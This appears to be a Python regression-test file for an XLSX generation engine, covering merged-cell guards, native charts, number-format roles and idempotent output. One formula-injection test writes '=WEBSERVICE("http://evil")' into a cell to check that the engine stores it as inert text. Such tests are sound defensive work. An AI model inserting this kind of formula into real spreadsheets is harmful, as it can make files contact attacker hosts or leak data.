# SPDX-License-Identifier: MIT
"""Regression tests for XLSX correctness fixes.

Covers the confirmed finding from the strategic review:

  - MERGED-CELL CRASH: filling or clearing a named region whose first row straddles
    a merged banner used to write ``.value`` onto a merge SLAVE cell, which openpyxl
    makes read-only -> ``AttributeError``, so ``generate`` crashed with no document
    produced. The extractor surfaces ``merged_header`` as valid region evidence, so
    the engine invited exactly the input it crashed on (merged banners/titles are
    near-universal in corporate financial templates). The fill/clear choke points
    now skip merge slaves; a dropped NON-``None`` fill is surfaced as a
    ``block_degraded`` WARNING (the merge anchor keeps its value) so the skip is
    visible in QA rather than a silent loss.

All shells are synthesized in a temp dir with openpyxl and never committed; the
range names used as ids are the synthetic author's OWN vocabulary carried as data.
"""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

from openpyxl import Workbook, load_workbook
from openpyxl.cell.cell import MergedCell
from openpyxl.workbook.defined_name import DefinedName

from brandkit.formats.xlsx import extract as xlsx_extract
from brandkit.formats.xlsx import generate as xlsx_generate
from brandkit.grid.model import GridDocument
from brandkit.profile import store
from brandkit.qa.model import Finding


class FillClearChokePointMergedCellGuard(unittest.TestCase):
    """Unit-level guard at the exact write choke points (no profile machinery)."""

    def _merged_ws(self):
        wb = Workbook()
        ws = wb.active
        ws["A1"] = "DEMO"
        ws.merge_cells("A1:C1")  # B1, C1 become read-only MergedCell slaves
        return wb, ws

    def test_fill_cell_anchor_is_written(self) -> None:
        _wb, ws = self._merged_ws()
        sink: list[Finding] = []
        xlsx_generate._fill_cell(ws["A1"], "NEW", sink=sink, where="banner")
        self.assertEqual(ws["A1"].value, "NEW")
        self.assertEqual(sink, [])  # writing the anchor is normal, no finding

    def test_fill_cell_merged_slave_is_skipped_and_surfaced(self) -> None:
        _wb, ws = self._merged_ws()
        slave = ws["B1"]
        self.assertIsInstance(slave, MergedCell)  # precondition: it IS a slave
        sink: list[Finding] = []
        # Before the fix this raised AttributeError ('... is read-only').
        xlsx_generate._fill_cell(slave, "x", sink=sink, where="banner")
        self.assertEqual(len(sink), 1)
        self.assertEqual(sink[0].check, "block_degraded")
        self.assertEqual(sink[0].severity, "WARNING")
        self.assertIn("B1", sink[0].message)

    def test_fill_cell_none_value_on_slave_is_silent(self) -> None:
        # A sparse / ragged grid cell (None) over a slave is a no-op with no noise.
        _wb, ws = self._merged_ws()
        sink: list[Finding] = []
        xlsx_generate._fill_cell(ws["B1"], None, sink=sink, where="banner")
        self.assertEqual(sink, [])

    def test_clear_region_skips_merged_slaves_without_crashing(self) -> None:
        wb, ws = self._merged_ws()
        target = {"sheet": ws.title, "range": "A1:C1"}
        # Before the fix this raised AttributeError on the B1/C1 slaves.
        ran = xlsx_generate._clear_region(wb, target)
        self.assertTrue(ran)

    def test_reassert_cover_style_skips_merged_slave(self) -> None:
        _wb, ws = self._merged_ws()
        # Setting .style on a MergedCell raises; the guard must skip it (no crash).
        xlsx_generate._reassert_cover_style(ws["B1"], "Normal")


class MergedBannerRegionEndToEnd(unittest.TestCase):
    """End-to-end: a named region straddling a merged banner generates cleanly."""

    def _build_shell(self, td: Path) -> Path:
        wb = Workbook()
        ws = wb.active
        ws.title = "S"
        ws["A1"] = "DEMO BANNER"
        ws.merge_cells("A1:C1")  # the named region's first row straddles this merge
        ws["A3"] = "label"
        wb.defined_names.add(DefinedName("banner", attr_text="S!$A$1:$C$1"))
        wb.defined_names.add(DefinedName("label_cell", attr_text="S!$A$3"))
        shell = td / "shell.xlsx"
        wb.save(shell)
        return shell

    def _extract(self, td: Path, shell: Path):
        old = os.getcwd()
        os.chdir(td)
        try:
            xlsx_extract.extract(shell, "syn", scope="project", cwd=td)
            return store.load_profile("syn", "project")
        finally:
            os.chdir(old)

    def test_fill_region_over_merged_banner_does_not_crash(self) -> None:
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            shell = self._build_shell(td)
            loaded = self._extract(td, shell)
            grid = GridDocument(
                regions={"banner": [["NEW BANNER", "x", "y"]]},
                cells={"label_cell": "Hello"},
            )
            out = td / "out.xlsx"
            sink: list[Finding] = []
            # Before the fix: AttributeError on the B1/C1 slaves, no file produced.
            xlsx_generate.generate(
                loaded.profile, loaded.shell_path, grid, out, findings=sink
            )
            self.assertTrue(out.is_file())

            wb = load_workbook(out)
            # The merge ANCHOR took the new value; the unrelated cell filled normally.
            self.assertEqual(wb["S"]["A1"].value, "NEW BANNER")
            self.assertEqual(wb["S"]["A3"].value, "Hello")
            # The dropped slave writes are surfaced, never silent.
            degraded = [f for f in sink if f.check == "block_degraded"]
            self.assertTrue(degraded)
            self.assertTrue(all(f.severity == "WARNING" for f in degraded))


class NativeXlsxChartTest(unittest.TestCase):
    """A GridDocument.charts spec becomes a NATIVE openpyxl chart that REFERENCES
    the workbook's own cell data (the xlsx peer of the inline-data docx/pptx chart):
    valid chart part, byte-idempotent, theme-colored, unknown-type fallback, and a
    missing-data spec degrades loudly (never a crash)."""

    def _shell(self, td: Path) -> Path:
        wb = Workbook()
        ws = wb.active
        ws.title = "Data"
        ws["A1"], ws["B1"], ws["C1"] = "Q", "A", "B"
        for i, (q, a, b) in enumerate(
            [("Q1", 12, 7), ("Q2", 15, 9), ("Q3", 14, 11), ("Q4", 19, 13)], start=2
        ):
            ws[f"A{i}"], ws[f"B{i}"], ws[f"C{i}"] = q, a, b
        wb.defined_names.add(DefinedName("hdr", attr_text="Data!$A$1"))
        shell = td / "shell.xlsx"
        wb.save(shell)
        return shell

    def _extract(self, td: Path, shell: Path):
        old = os.getcwd()
        os.chdir(td)
        try:
            xlsx_extract.extract(shell, "syn", scope="project", cwd=td)
            return store.load_profile("syn", "project")
        finally:
            os.chdir(old)

    def _chart_parts(self, path: Path) -> dict:
        import zipfile

        with zipfile.ZipFile(path) as z:
            return {
                n: z.read(n).decode("utf-8", "ignore")
                for n in z.namelist()
                if "/charts/chart" in n and n.endswith(".xml")
            }

    def test_chart_specs_become_native_charts(self) -> None:
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._shell(td))
            grid = GridDocument(
                charts=[
                    {
                        "sheet": "Data",
                        "type": "bar",
                        "title": "Ricavi",
                        "anchor": "E1",
                        "data": "B1:C5",
                        "categories": "A2:A5",
                    },
                    {
                        "sheet": "Data",
                        "type": "pie",
                        "title": "Quota",
                        "anchor": "E18",
                        "data": "B2:B5",
                        "categories": "A2:A5",
                        "data_titles": False,
                    },
                ]
            )
            out = td / "out.xlsx"
            sink: list[Finding] = []
            xlsx_generate.generate(
                loaded.profile, loaded.shell_path, grid, out, findings=sink
            )
            parts = self._chart_parts(out)
            self.assertEqual(len(parts), 2, "two native chart parts expected")
            joined = "".join(parts.values())
            # openpyxl serializes the chart with the chart namespace as DEFAULT (no
            # ``c:`` prefix), so the elements are ``<barChart>`` / ``<pieChart>``.
            self.assertIn("<barChart", joined)
            self.assertIn("<pieChart", joined)
            # references the workbook's own cell data (sheet-qualified A1 ranges)
            self.assertIn("'Data'!", joined)
            self.assertIn("$B$2:$B$5", joined)
            # No literal series fill color is written -> the chart inherits the theme.
            self.assertNotIn("srgbClr", joined)
            self.assertFalse([f for f in sink if f.check == "block_degraded"])

    def test_chart_generation_is_byte_idempotent(self) -> None:
        # openpyxl serializes the chart/drawing parts; repack_fixed_timestamps pins
        # the ZIP + core.xml so two identical generations are byte-identical.
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._shell(td))
            grid = GridDocument(
                charts=[
                    {
                        "sheet": "Data",
                        "type": "bar",
                        "anchor": "E1",
                        "data": "B1:C5",
                        "categories": "A2:A5",
                    }
                ]
            )
            a, b = td / "a.xlsx", td / "b.xlsx"
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, a)
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, b)
            self.assertEqual(
                a.read_bytes(), b.read_bytes(), "native-chart xlsx not byte-idempotent"
            )

    def test_unknown_type_fallback_and_missing_data_degrades(self) -> None:
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._shell(td))
            grid = GridDocument(
                charts=[
                    {  # unknown type -> fallback to a column chart (still authored)
                        "sheet": "Data",
                        "type": "nonsense",
                        "anchor": "E1",
                        "data": "B1:C5",
                        "categories": "A2:A5",
                    },
                    {
                        "sheet": "Data",
                        "type": "bar",
                        "anchor": "E18",
                    },  # no data -> skip
                ]
            )
            out = td / "out.xlsx"
            sink: list[Finding] = []
            xlsx_generate.generate(
                loaded.profile, loaded.shell_path, grid, out, findings=sink
            )
            self.assertEqual(len(self._chart_parts(out)), 1)  # only the fallback chart
            self.assertTrue(any(f.check == "chart_type_fallback" for f in sink))
            self.assertTrue(any(f.check == "block_degraded" for f in sink))


class NumberFormatRoleTest(unittest.TestCase):
    """The number_format resolver is wired end-to-end (extract -> resolve -> apply):
    the template's own masks become ``number.<family>`` roles, a Grid names the
    brand-agnostic intent, and generate fills the template's VERBATIM mask -
    fail-closed when the family is absent, never fabricating a format."""

    def test_classifier_families(self) -> None:
        from brandkit.formats.xlsx import structure as xs

        cases = {
            "0.00%": "percent",
            '"$"#,##0.00': "currency",
            "[$€-2]#,##0.00": "currency",
            "_($* #,##0.00_)": "accounting",
            "yyyy-mm-dd": "date",
            "m/d/yy h:mm": "datetime",
            "h:mm:ss": "time",
            "#,##0": "integer",
            "#,##0.00": "decimal",
            "@": "text",
            "0.00E+00": "scientific",
            "General": None,
            "": None,
            # Elapsed-time masks (time token only inside brackets) -> time, not None.
            "[h]:mm": "time",
            "[mm]:ss": "time",
            # Accounting mask whose currency sits in a bracket + padding idioms.
            r"_-[$€-2]* #,##0.00_-;-[$€-2]* #,##0.00_-": "accounting",
        }
        for code, fam in cases.items():
            self.assertEqual(xs.number_format_family(code), fam, code)

    def _build_shell(self, td: Path) -> Path:
        wb = Workbook()
        ws = wb.active
        ws.title = "Data"
        ws["A1"] = 1234.5
        ws["A1"].number_format = '"$"#,##0.00'
        ws["A2"] = 0.25
        ws["A2"].number_format = "0.0%"
        ws["A3"] = 42
        ws["A3"].number_format = "#,##0"
        wb.defined_names.add(DefinedName("price", attr_text="Data!$B$1"))
        wb.defined_names.add(DefinedName("shares", attr_text="Data!$B$2:$B$3"))
        shell = td / "shell.xlsx"
        wb.save(shell)
        return shell

    def _extract(self, td: Path, shell: Path):
        old = os.getcwd()
        os.chdir(td)
        try:
            xlsx_extract.extract(shell, "nf", scope="project", cwd=td)
            return store.load_profile("nf", "project")
        finally:
            os.chdir(old)

    def test_extract_emits_number_roles_bound_to_template_masks(self) -> None:
        from brandkit.profile import schema

        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._build_shell(td))
            roles = loaded.profile["roles"]
            self.assertEqual(
                roles["number.currency"]["resolver"]["number_format"], '"$"#,##0.00'
            )
            self.assertEqual(
                roles["number.percent"]["resolver"]["number_format"], "0.0%"
            )
            self.assertEqual(
                roles["number.integer"]["resolver"]["number_format"], "#,##0"
            )
            self.assertEqual(schema.validate(loaded.profile), [])

    def test_generate_applies_resolved_mask_to_cell_and_region(self) -> None:
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._build_shell(td))
            grid = GridDocument(
                cells={"price": 99.9},
                regions={"shares": [[0.1], [0.2]]},
                formats={"price": "currency", "shares": "percent"},
            )
            out = td / "out.xlsx"
            sink: list[Finding] = []
            xlsx_generate.generate(
                loaded.profile, loaded.shell_path, grid, out, findings=sink
            )
            ws = load_workbook(out)["Data"]
            self.assertEqual(ws["B1"].number_format, '"$"#,##0.00')
            self.assertEqual(ws["B2"].number_format, "0.0%")
            self.assertEqual(ws["B3"].number_format, "0.0%")
            self.assertFalse(any(f.check == "number_format_degraded" for f in sink))

    def test_unknown_family_degrades_fail_closed_without_fabricating(self) -> None:
        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._build_shell(td))
            grid = GridDocument(cells={"price": 1}, formats={"price": "klingon"})
            out = td / "out.xlsx"
            sink: list[Finding] = []
            xlsx_generate.generate(
                loaded.profile, loaded.shell_path, grid, out, findings=sink
            )
            degraded = [f for f in sink if f.check == "number_format_degraded"]
            self.assertEqual(len(degraded), 1)
            self.assertEqual(degraded[0].severity, "WARNING")
            # No format was fabricated: the cell keeps its default General mask.
            self.assertEqual(load_workbook(out)["Data"]["B1"].number_format, "General")

    def test_fabricated_mask_is_rejected_by_validate(self) -> None:
        from brandkit.profile import schema

        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._build_shell(td))
            loaded.profile["roles"]["number.currency"]["resolver"]["number_format"] = (
                "FABRICATED"
            )
            problems = schema.validate(loaded.profile)
            self.assertTrue(any("number_format" in p for p in problems), problems)

    def test_number_format_generation_is_idempotent(self) -> None:
        import hashlib

        with tempfile.TemporaryDirectory() as t:
            td = Path(t)
            loaded = self._extract(td, self._build_shell(td))
            grid = GridDocument(cells={"price": 99.9}, formats={"price": "currency"})
            a, b = td / "a.xlsx", td / "b.xlsx"
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, a)
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, b)
            self.assertEqual(
                hashlib.sha256(a.read_bytes()).hexdigest(),
                hashlib.sha256(b.read_bytes()).hexdigest(),
            )


class NumberFormatResolverLegalityTest(unittest.TestCase):
    """A number_format resolver is legal ONLY for xlsx: smuggled into a docx/pptx
    profile it must be rejected by validate (the per-kind brand-guarantee gate)."""

    def test_number_format_role_rejected_on_non_xlsx_kind(self) -> None:
        from brandkit.profile import schema

        for kind in ("docx", "pptx"):
            prof = schema.build_envelope(kind, {"name": "t"})
            prof["roles"] = {
                "_index": ["number.currency"],
                "number.currency": {
                    "resolver": {"type": "number_format", "number_format": "0.00"},
                    "status": "best_effort",
                },
            }
            problems = schema.validate(prof)
            self.assertTrue(
                any("number_format" in p and "not legal" in p for p in problems),
                f"{kind}: {problems}",
            )


class FormulaInjectionTest(unittest.TestCase):
    """The engine never AUTHORS formulas: an author '='-led value is neutralized to a
    TEXT cell (verbatim, not executed) and surfaced, and the QA gate fails closed on
    any output formula the shell did not have (defense-in-depth)."""

    def test_fill_cell_neutralizes_author_formula_to_text(self) -> None:
        wb = Workbook()
        ws = wb.active
        sink: list[Finding] = []
        wrote = xlsx_generate._fill_cell(
            ws["A1"], '=WEBSERVICE("http://evil")', sink=sink, where="x"
        )
        self.assertTrue(wrote)
        self.assertEqual(ws["A1"].data_type, "s")  # TEXT, never a live formula
        self.assertEqual(ws["A1"].value, '=WEBSERVICE("http://evil")')  # verbatim
        self.assertEqual(len(sink), 1)
        self.assertEqual(sink[0].check, "formula_injection_neutralized")
        self.assertEqual(sink[0].severity, "WARNING")

    def test_fill_cell_preserves_shell_formula_and_returns_false(self) -> None:
        wb = Workbook()
        ws = wb.active
        ws["A1"] = "=1+2"  # an existing shell formula
        wrote = xlsx_generate._fill_cell(ws["A1"], 99, where="x")
        self.assertFalse(wrote)  # not written -> caller must not format it
        self.assertEqual(ws["A1"].value, "=1+2")  # preserved verbatim

    def test_qa_flags_a_newly_authored_output_formula(self) -> None:
        from brandkit.qa import checks_deterministic as cd

        with tempfile.TemporaryDirectory() as t:
            t = Path(t)
            wb = Workbook()
            wb.active["A1"] = "x"
            shell = t / "shell.xlsx"
            wb.save(shell)
            wb2 = Workbook()
            wb2.active["A1"] = "x"
            wb2.active["B1"] = "=1+2"  # a formula the shell did NOT have
            out = t / "out.xlsx"
            wb2.save(out)
            prof = {"kind": "xlsx"}
            findings = cd.check_formula_preservation(shell, out, prof)
            self.assertTrue(
                any(
                    f.severity == "ERROR" and "never authors" in f.message
                    for f in findings
                ),
                [f.message for f in findings],
            )


class XlsxIdempotencyEdgeTest(unittest.TestCase):
    def test_generate_is_idempotent_when_shell_core_xml_lacks_created(self) -> None:
        # openpyxl fabricates a wall-clock created when the shell has none; the
        # generator pins a fixed created so generate-twice stays byte-identical.
        import hashlib
        import re
        import zipfile

        with tempfile.TemporaryDirectory() as t:
            t = Path(t)
            wb = Workbook()
            wb.active["A1"] = "x"
            wb.defined_names.add(DefinedName("cellx", attr_text="Sheet!$A$1"))
            shell = t / "shell.xlsx"
            wb.save(shell)
            # Strip <dcterms:created> from the shell's core.xml.
            parts = {}
            with zipfile.ZipFile(shell) as z:
                for n in z.namelist():
                    parts[n] = z.read(n)
            parts["docProps/core.xml"] = re.sub(
                rb"<dcterms:created[^>]*>[^<]*</dcterms:created>",
                b"",
                parts["docProps/core.xml"],
            )
            with zipfile.ZipFile(shell, "w") as z:
                for n, b in parts.items():
                    z.writestr(n, b)
            old = os.getcwd()
            os.chdir(t)
            try:
                xlsx_extract.extract(shell, "nc", scope="project", cwd=t)
                loaded = store.load_profile("nc", "project")
            finally:
                os.chdir(old)
            grid = GridDocument(cells={"cellx": "hello"})
            a, b = t / "a.xlsx", t / "b.xlsx"
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, a)
            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, b)
            self.assertEqual(
                hashlib.sha256(a.read_bytes()).hexdigest(),
                hashlib.sha256(b.read_bytes()).hexdigest(),
            )


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
